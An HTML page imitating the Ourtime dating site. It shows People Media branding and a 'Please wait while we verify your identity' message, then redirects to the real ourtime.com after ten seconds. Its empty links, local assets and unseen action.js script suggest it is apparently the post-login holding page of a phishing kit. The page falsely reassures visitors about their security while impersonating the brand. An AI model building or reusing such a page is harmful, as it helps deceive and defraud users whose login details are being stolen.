<!doctype html>
<html style="background-image:none">
<head>
<meta charset="utf-8">
<title>Ourtime - Wait.....</title>
<link rel="stylesheet" href="css/style.css">
<script src="js/jqueryLib.js" type="text/javascript"></script>
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta http-equiv="pragma" content="no-cache"><meta name="robots" content="noydir, noodp">
<link rel="shortcut icon" type="image/x-icon" href="images/favicon3.png" data-react-helmet="true">
<meta http-equiv="Refresh" content="10;URL=https://www.ourtime.com" >
<script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
</head>

<body>
  <div class="row-21">
    	<div class="row-21-content">
        	<div class="row-21-people-logo"></div>
        </div>
    </div>
   <div class="row-24">
   	<div class="row-24-panel">
    	<span style="color:#55307c;font-size:21px">Please Wait</span><br><br>
        <span style="font-size:15px">Your online security is important for us. Please wait while we verify your identity.</span>
        <div><img src="images/ellipsis.gif" width="120" height="120"></div>
    </div>
   </div>
 <div class="row-20">
 	<div class="row-20-content">
    	Copyright © <script type="text/javascript">document.write(new Date().getFullYear());</script> &nbsp;</span> People Media. All rights reserved. 166x2617  . <a href="" style="color:#009fdb">Term of use</a> | <a href="" style="color:#009fdb">Privacy Policy</a> | <a href="" style="color:#009fdb">Cookies Policy</a>

    </div>
 </div>
 <div class="row-23">
 	<div class="row-23-content">
    	

<a href="" style="color:#009fdb;text-decoration:none">home</a> | <a href="" style="color:#009fdb;text-decoration:none">safety tips</a> | <a href="" style="color:#009fdb;text-decoration:none">contact us</a> | <a href="" style="color:#009fdb;text-decoration:none">billing</a> | <a href="" style="color:#009fdb;text-decoration:none">success stories</a> | <a href="" style="color:#009fdb;text-decoration:none">careers </a>| <a href="" style="color:#009fdb;text-decoration:none">about</a> | <a href="" style="color:#009fdb;text-decoration:none">advertise with us</a> | <a href="" style="color:#009fdb;text-decoration:none">search</a> |<a href="" style="color:#009fdb;text-decoration:none"> join now</a> |<a href="" style="color:#009fdb;text-decoration:none"> bookmark page</a> |<a href="" style="color:#009fdb;text-decoration:none"> site map</a>
<a href="" style="color:#009fdb;text-decoration:none">Match.com</a> | <a href="" style="color:#009fdb;text-decoration:none">Chemistry.com </a>| <a href="" style="color:#009fdb;text-decoration:none">Mature Dating</a> |<a href="" style="color:#009fdb;text-decoration:none"> Black Singles</a> | <a href="" style="color:#009fdb;text-decoration:none">Big and Beautiful</a>

    </div>
 </div>
<script src="js/action.js" type="text/javascript"></script>
</body>
</html>